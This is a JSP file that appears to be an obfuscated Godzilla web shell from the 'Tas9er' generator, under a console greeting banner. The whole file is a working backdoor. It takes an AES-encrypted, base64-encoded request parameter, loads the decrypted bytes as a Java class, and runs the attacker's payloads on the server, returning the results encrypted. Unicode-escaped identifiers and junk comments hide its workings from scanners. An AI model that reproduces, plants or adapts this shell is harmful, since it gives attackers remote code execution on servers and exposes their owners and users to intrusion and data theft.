Hello Administrator!Welcome To Tas9er Godzilla JSP Console!
<%! String govsb_N = "30b650337707c61f";
    String govsb_SQZYBk = "Tas9er";
    class govsb_YVA8DCjo extends /*edusb_8G0D*/ClassLoader {
        public govsb_YVA8DCjo(ClassLoader govsb_jzaqaTjRyhwTI) {
            super/*edusb_QR8Tm*/(govsb_jzaqaTjRyhwTI);
        }
        public Class govsb_MI(byte[] govsb_F85heIuvU) {
            return super./*edusb_TkPoVo7CMeviu7*/\u0064\u0065\u0066\u0069\u006e\u0065\u0043\u006c\u0061\u0073\u0073/*edusb_ZxKd*/(govsb_F85heIuvU, 1249962-1249962, govsb_F85heIuvU.length);
        }
    }
    public byte[] govsb_9XlhdlNm59VLNgD(byte[] govsb_lZPI3dToCM, boolean govsb_Znomsg) {
        try {
            j\u0061\u0076\u0061\u0078./*edusb_9cKjIo*/\u0063\u0072\u0079\u0070\u0074\u006f.Cipher govsb_Q6zs4klJiXq = j\u0061\u0076\u0061\u0078.\u0063\u0072\u0079\u0070\u0074\u006f.Cipher.\u0067\u0065\u0074\u0049\u006e\u0073\u0074\u0061\u006e\u0063e/*edusb_xLzjQvolbHvaTI5*/("AES");
            govsb_Q6zs4klJiXq.init(govsb_Znomsg?1249962/1249962:1249962/1249962+1249962/1249962,new j\u0061\u0076\u0061\u0078.\u0063\u0072\u0079\u0070\u0074\u006f.spec./*edusb_sqwkkeEsE*/SecretKeySpec/*edusb_E7*/(govsb_N.getBytes(), "AES"));
            return govsb_Q6zs4klJiXq.doFinal/*edusb_UM0KvZXA6ZfZ*/(govsb_lZPI3dToCM);
        } catch (Exception e) {
            return null;
        }
     }
    %><%
    try {
        byte[] govsb_kHZwmZwWbt = java.util.Base64./*edusb_w*/\u0067\u0065\u0074\u0044\u0065\u0063\u006f\u0064\u0065\u0072()./*edusb_YLdYuXA*/decode(request.getParameter(govsb_SQZYBk));
        govsb_kHZwmZwWbt = govsb_9XlhdlNm59VLNgD(govsb_kHZwmZwWbt,false);
        if (session.getAttribute/*edusb_trzL0W9vJu03*/("payload") == null) {
            session.setAttribute("payload", new govsb_YVA8DCjo(this.\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073()./*edusb_zQDXQtq*/\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073Loader())/*edusb_SkAo*/.govsb_MI(govsb_kHZwmZwWbt));
        } else {
            request.setAttribute("parameters", govsb_kHZwmZwWbt);
            java.io.ByteArrayOutputStream govsb_wGbtFNZM = new java.io./*edusb_vvJi*/ByteArrayOutputStream();
            Object govsb_91oYmuZAtRt = /*edusb_xm*/((Class) session.getAttribute("payload"))./*edusb_k*//*edusb_LG7jSn1*/new\u0049\u006e\u0073\u0074\u0061\u006e\u0063\u0065()/*edusb_hEDTz6Dqfn*/;
            govsb_91oYmuZAtRt.equals(govsb_wGbtFNZM);
            govsb_91oYmuZAtRt.equals(pageContext);
            response.getWriter().write("A845524AAB392B3FF649C44CB1C7F412".substring(1249962-1249962, 16));
            govsb_91oYmuZAtRt.toString();
            response.getWriter().write(java.util.Base64/*edusb_Dlr3QATN*/.getEncoder()/*edusb_lwsxEsKWaYwyEPh*/.encodeToString(govsb_9XlhdlNm59VLNgD(govsb_wGbtFNZM.toByteArray(),true)));
            response.getWriter().write("A845524AAB392B3FF649C44CB1C7F412".substring(16));
        }
    } catch (Exception e) {
    }
%>